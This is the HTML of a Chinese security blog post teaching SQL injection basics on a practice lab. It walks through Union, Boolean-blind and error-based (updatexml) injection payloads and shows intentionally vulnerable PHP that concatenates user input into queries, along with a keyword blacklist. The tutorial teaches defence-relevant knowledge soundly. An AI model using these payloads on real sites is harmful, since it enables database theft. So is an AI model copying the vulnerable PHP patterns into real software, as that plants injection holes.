@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="">
+
+<title>SQL注入漏洞基础 || woejk0x&#39;s blogs</title>
+<link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="SQL注入漏洞基础">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wo3jk.github.io/2026/02/03/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="woejk0x&#39;s blogs">
+<meta property="og:author" content="woejk0x">
+
+  
+  
+  
+  <meta name="description" content="简介SQL注入是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数被带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。以PHP语句为例，命令如下：$query=&amp;quot;SELECT*FROMusersWHEREid=$_GET[&amp;#39;i">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello hexo-theme-wang"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
+                        
+                        首页
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
+                        
+                        归档
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories" rel="noopener">
+                        
+                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
+                        
+                        分类
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
+                        
+                        标签
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about" rel="noopener">
+                        
+                            <img src="/images/menu_ico/about.svg" class="menu-icon" alt="关于">
+                        
+                        关于
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
+                        
+                        友链
+                    </a>
+                </li>
+            
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">woejk0x's blogs</h2>
+        <img class="avatar avatar-round" src="/images/Myblogs.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">woejk0x</h2>
+        <h3 class="site-subtitle">网络安全爱好者，目标是成为一名优秀的渗透测试工程师</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a target="_blank" rel="noopener" href="https://github.com/Wo3jk" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">SQL注入漏洞基础</h1>
+
+    <div class="post-meta">
+      <span class="post-date">发布于 <time datetime="2026-02-03T07:00:00.000Z">2026-02-03</time></span>
+      
+        <span class="post-categories">
+          分类：<a class="category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          最后更新于 <time datetime="2026-02-03T04:14:26.956Z">2026-02-03</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL注入是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数被带入数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。<br>以PHP语句为例，命令如下：<br><code>$query = &quot;SELECT * FROM users WHERE id = $_GET[&#39;id&#39;]&quot;;</code><br>这里的参数ID可控，且被带入数据库查询，恶意用户可以任意拼接SQL语句进行攻击。</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>SQL注入漏洞的产生需要满足以下两个条件。</p>
+<ul>
+<li>参数可控</li>
+<li>参数拼接进数据库查询语句</li>
+</ul>
+<h1 id="MySQL中的相关知识点"><a href="#MySQL中的相关知识点" class="headerlink" title="MySQL中的相关知识点"></a>MySQL中的相关知识点</h1><p>在information_schema库中，需要记住三个表名，SCHEMATA、TABLES和COLUMNS。<br>SCHEMATA表存储该用户创建的所有数据库的库名，该表中记录数据库库名的字段名为SCHEMA_NAME。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130162235.png"><br>TABLES表存储该用户创建的所有数据库的库名和表名。该表中记录数据库库名和表名的字段名分别为TABLE_SCHEMA和TABLE_NAME。<br>COLUMNS表存储该用户创建的所有数据库的库名、表名和字段名<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130162732.png"><br>常见的MySQL查询语句和语法如下。</p>
+<h2 id="MySQL查询语句"><a href="#MySQL查询语句" class="headerlink" title="MySQL查询语句"></a>MySQL查询语句</h2><p>在不知道任何条件时，语句如下：<br><code>SELECT 要查询的字段名 FROM 库名.表名</code><br>在有一条已知条件时，语句如下：<br><code>SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件的字段名=&#39;已知条件的值&#39;</code><br>在有两条已知条件时，语句如下：<br><code>SELECT 要查询的字段名 FROM 库名.表名 WHERE 已知条件1的字段名=&#39;已知条件1的值&#39; AND 已知条件2的字段名=&#39;已知条件2的值&#39;</code></p>
+<h2 id="limit的用法"><a href="#limit的用法" class="headerlink" title="limit的用法"></a>limit的用法</h2><p>limit的使用格式为<code>limit m,n</code>，其中m指记录开始的位置，m为0时表示从第一条记录开始读取；n指取n条记录。例如，<code>limit 0,1</code>表示从第一条记录开始，取一条记录。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130163800.png"><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130163903.png"></p>
+<h2 id="需要记住的几个函数"><a href="#需要记住的几个函数" class="headerlink" title="需要记住的几个函数"></a>需要记住的几个函数</h2><ul>
+<li>database()：当前网站使用的数据库。</li>
+<li>version()：当前MySQL的版本。</li>
+<li>user()：当前MySQL的用户。</li>
+</ul>
+<h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><p><code>&quot;#&quot; &quot;--空格&quot; &quot;/**/&quot;</code></p>
+<h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><p>内联注释的形式为<code>/*!code*/</code>。内联注释可以用于整个SQL语句中，用来执行SQL语句，例如：<br><code>index.php?id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</code></p>
+<h1 id="Union注入攻击"><a href="#Union注入攻击" class="headerlink" title="Union注入攻击"></a>Union注入攻击</h1><p>访问靶场网址<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130164651.png"><br>在URL后添加一个单引号<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130164752.png"><br>访问id&#x3D;1 and 1&#x3D;1<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130164859.png"><br>访问id&#x3D;1 and 1&#x3D;2<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130164949.png"><br>判断该网站存在SQL注入漏洞<br>使用order by 1-99语句查询该数据表的字段数量。<br>访问id&#x3D;1 order by 5<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130165155.png"><br>访问id&#x3D;1 order by 6<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130165252.png"><br>判断字段数为5<br>Union注入的语句如下：<br><code>union select 1,2,3,4,5</code><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130165641.png"><br>页面成功执行，但没有返回union select的结果，这是因为代码只返回第一条结果。<br>可以通过修改ID的值为不存在的，例如id&#x3D;-1<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130165948.png"><br>判断2和5的位置可以输入SQL语句进行查询回显，访问<br><code>id=-1 union select 1,database(),3,4,5</code><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130170250.png"><br>查询表名<br><code>select table_name from information_schema.tables where table_schema=&#39;test&#39; limit 0,1;</code><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130171543.png"><br>已知库名和表名，接下来查询字段名。<br><code>select column_name from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;users&#39; limit 1,0;</code><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130200635.png"><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130200732.png"><br>知道了库名，表名和字段名就可以查询数据了<br><code>select username from test.users limit 0,1;</code><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130201554.png"></p>
+<h1 id="Union注入代码分析"><a href="#Union注入代码分析" class="headerlink" title="Union注入代码分析"></a>Union注入代码分析</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;test&quot;);</span><br><span class="line">if (mysqli_connect_errno())</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;连接失败：&quot; . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$result = mysqli_query($con,&quot;select * from users where `id`=&quot;.$id);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">echo $row[&#x27;username&#x27;] . &quot; : &quot; . $row[&#x27;address&#x27;]</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当访问id&#x3D;1 union select 1,2,3,4,5时，执行的SQL语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where `id`=1 union select 1,2,3,4,5</span><br></pre></td></tr></table></figure>
+<p>此时利用第二条语句（Union查询）就可以获取数据库中的数据。</p>
+<h1 id="Boolean注入攻击"><a href="#Boolean注入攻击" class="headerlink" title="Boolean注入攻击"></a>Boolean注入攻击</h1><p>访问网址，返回yes<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130203508.png"><br>在URL后添加一个单引号，返回no<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130210102.png"><br>访问id&#x3D;1’ and 1&#x3D;1%23，id&#x3D;1’ and 1&#x3D;2%23，返回的结果分别是yes和no。若更改ID的值，返回的依然是yes和no，由此判断页面只返回yes或no，不会返回数据库数据，所以此处不可使用Union注入。此处可以使用Boolean注入。<br>Boolean注入是指构造SQL判断语句，通过查看页面的返回结果推测哪些SQL判断条件是成立的，以此获取数据库中的数据。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130210626.png"><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130211845.png"><br>判断库名长度<br><code>1&#39; and length(database())&gt;=1--+</code><br>有单引号，所以需要注释符来注释。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130212213.png"><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130212228.png"><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130212243.png"><br>可以判断库名的字符长度为5。<br>通过逐字符判断的方式获取数据库名。<br><code>1&#39; and substr(database(),1,1)=&#39;t&#39;--+</code><br>substr是截取database()的值，从第一个字符开始，每次只返回一个。<br>注：limit是从0开始排序。<br>可以使用Burp Suite爆破’t’值<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130213959.png"><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130213942.png"><br>判断数据库库名的第一位为t<br>还可以使用ASCII码的字符进行查询，在MySQL中，ASCII转换的函数为ord<br><code>1&#39; and ord(substr(database(),1,1))=116--+</code><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130214847.png"><br>就这样依次判断后续三个字符<br>判断表名：<br><code>1&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;test&#39; limit 0,1),1,1)=&#39;u&#39;--+</code><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260130215744.png"><br>就这样可以依次判断出表名和字段名</p>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;test&quot;);</span><br><span class="line">if (mysqli_connect_errno())</span><br><span class="line">&#123;</span><br><span class="line">	echo&quot;连接失败：&quot; . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">if (preg_match(&quot;/union|sleep|benchmark/i&quot;, $id)) &#123;</span><br><span class="line">	exit(&quot;no&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$result = mysqli_query($con,&quot;select * from users where `id`=&#x27;&quot;.$id.&quot;&#x27;&quot;);</span><br><span class="line">$row = mysqli_fetch_array($result);</span><br><span class="line">if ($row) &#123;</span><br><span class="line">	exit(&quot;yes&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	exit(&quot;no&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当访问id&#x3D;1’ or 1&#x3D;1%23时，数据库执行的语句为select * from users where ‘id’&#x3D;’1’ or 1&#x3D;1#，由于or 1&#x3D;1是永真条件，所以此时页面肯定会返回yes。当访问id&#x3D;1’ and 1&#x3D;2%23时，数据库执行的语句为<code>select * from users where &#39;id&#39;=&#39;1&#39; and 1=2#</code>，由于and ‘1’&#x3D;’2’是永假条件，所以此时页面肯定会返回no。</p>
+<h1 id="报错注入攻击"><a href="#报错注入攻击" class="headerlink" title="报错注入攻击"></a>报错注入攻击</h1><p>访问<code>error.php?username=1&#39;</code><br>因为参数username的值是1’，在数据库中执行SQL时，会因为多了一个单引号而报错，输出到页面的结果如图所示。<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260131124507.png"><br>通过页面返回结果可以看出，程序直接将错误信息输出到了页面上，<br>所以可以利用报错注入获取数据。报错注入有多种格式，此处利用函数<code>updatexml()</code>演示SQL语句获取user()的值，SQL语句如下所示。<br><code>1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</code><br>其中0x7e是ASCII编码，解码结果为~.<br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260131124920.png"><br>然后尝试获取当前数据库的库名<br><code>1&#39; and updatexml(1,concat(ex7e,(select database()),0x7e),1)--+</code><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260131125052.png"><br>接着可以利用select语句继续获取数据库中的库名、表名和字段名，查询语句与<br>Union注入的相同。因为报错注入只显示一条结果，所以需要使用limit语句。构造的<br>语句如下所示。<br><code>1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+</code><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260131125344.png"><br>构造查询表名的语句，如下所示，可以获取数据库test的表名。<br><code>1&#39;and updatexml(1,concat(ex7e,(select table_name from information_schema.tables where table_schema=&#39;test&#39; 1imit 0,1),0x7e),1)--+</code><br><img src="/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/Pastedimage20260131125659.png"></p>
+<h1 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;test&quot;);</span><br><span class="line">if (mysqli_connect_errno())</span><br><span class="line">&#123;</span><br><span class="line">	echo&quot;连接失败: &quot; . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line">$username = $_GET[&#x27;username&#x27;];</span><br><span class="line">if($result = mysqli_query($con,&quot;select * from users where</span><br><span class="line">`username`=&#x27;&quot;.$username.&quot;&#x27;&quot;))&#123;</span><br><span class="line">	echo &quot;ok&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo mysqli_error($con);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>输入<code>username=1&#39;</code>时，SQL语句为select * from users where <code>username</code>&#x3D;’1’’。执行时，<br>会因为多了一个单引号而报错。利用这种错误回显，我们可以通过floor()、updatexml()<br>等函数将要查询的内容输出到页面上。</p>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>作者</p>
+                        <p>woejk0x</p>
+                    </div>
+                    <div class="title">
+                        <p>标题</p>
+                        <p>SQL注入漏洞基础</p>
+                    </div>
+                        <div class="publish">
+                            <p>发布于</p>
+                            <p>2026-02-03</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>授权协议</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">上一篇</span>
+        <a href="/2026/02/03/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a>
+      </div>
+    
+    
+      <div class="post-next">
+        <span class="nav-label">下一篇</span>
+        <a href="/2026/02/03/XSS%E8%BF%9B%E9%98%B6/">XSS进阶</a>
+      </div>
+    
+  </nav>
+  
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E4%B8%AD%E7%9A%84%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">MySQL中的相关知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">3.1.</span> <span class="toc-text">MySQL查询语句</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#limit%E7%9A%84%E7%94%A8%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">limit的用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E8%AE%B0%E4%BD%8F%E7%9A%84%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">需要记住的几个函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">3.4.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="toc-number">3.5.</span> <span class="toc-text">内联注释</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Union%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">Union注入攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Union%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">Union注入代码分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Boolean%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">6.</span> <span class="toc-text">Boolean注入攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">7.</span> <span class="toc-text">代码分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">8.</span> <span class="toc-text">报错注入攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-number">9.</span> <span class="toc-text">代码分析</span></a></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/%E5%9F%BA%E7%A1%80/" class="tag" aria-label="标签: #基础">#基础</a>
+            
+                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="tag" aria-label="标签: #SQL注入">#SQL注入</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+                <div class="category-item">
+                    <a href="/categories/Web%E6%BC%8F%E6%B4%9E/" aria-label="分类: Web漏洞">
+                        Web漏洞
+                        <span>(13)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a> 驱动
+        <p style="display: inline; color: red;">❤</p>
+        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> 主题构建
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+</main>
+</body>
+</html>
